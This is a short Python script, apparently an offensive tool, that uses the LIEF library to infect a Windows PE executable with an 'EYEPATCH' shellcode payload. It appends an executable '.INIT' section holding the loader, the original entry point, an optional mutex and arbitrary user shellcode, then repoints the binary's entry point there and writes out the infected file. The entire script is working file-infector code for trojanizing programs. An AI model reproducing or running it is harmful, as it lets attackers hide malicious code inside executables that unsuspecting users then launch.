#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import lief
import string
import struct
import random
import argparse

##
## Main: Inject code into the PE.
##
if __name__ in '__main__':
    Opt = argparse.ArgumentParser( description = 'Infect an arbitrary PE with the EYEPATCH payload.' );
    Opt.add_argument( '-pe', help = 'Path to a PE to infect.', required = True, type = argparse.FileType( 'rb+' ) );
    Opt.add_argument( '-out', help = 'Path to a file to store the infected PE.', required = True, type = str );
    Opt.add_argument( '-mutex', help = 'Use a mutex to ensure that it is run once.', required = False, action = 'store_true', default = False );
    Opt.add_argument( '-eyepatch', help = 'EYEPATCH shellcode to configure.', required = True, type = argparse.FileType( 'rb+' ) );
    Opt.add_argument( '-shellcode', help = 'Path to a custom payload to deploy with EYEPATCH', required = True, type = argparse.FileType( 'rb+' ) );
    Arg = Opt.parse_args();

    ##
    ## Parse PE
    ##
    Obj = lief.parse( Arg.pe.name );

    print( Arg.mutex );

    ##
    ## Add Config
    ##
    Buf  = Arg.shellcode.read();
    Cfg  = struct.pack( '!I', Obj.optional_header.addressof_entrypoint );
    Cfg += struct.pack( '!I', len( Buf ) ); 
    Cfg += struct.pack( '!B', Arg.mutex );
    Cfg += 'Global\\{}\0'.format( ''.join( random.choices( string.ascii_lowercase, k=5 ) ) ).encode()
    Cfg += Buf;

    ##
    ## Add LIEF section
    ##
    Sec = lief.PE.Section( ".INIT" );
    Sec.characteristics = lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE | lief.PE.SECTION_CHARACTERISTICS.MEM_READ;
    Sec.content = list( Arg.eyepatch.read() + Cfg );
    Sec = Obj.add_section( Sec );

    ##
    ## Patch entrypoint
    ##
    Obj.optional_header.addressof_entrypoint = Sec.virtual_address;

    ##
    ## Build a new PE
    ##
    Bld = lief.PE.Builder( Obj );
    Bld.build();
    Bld.write( Arg.out );
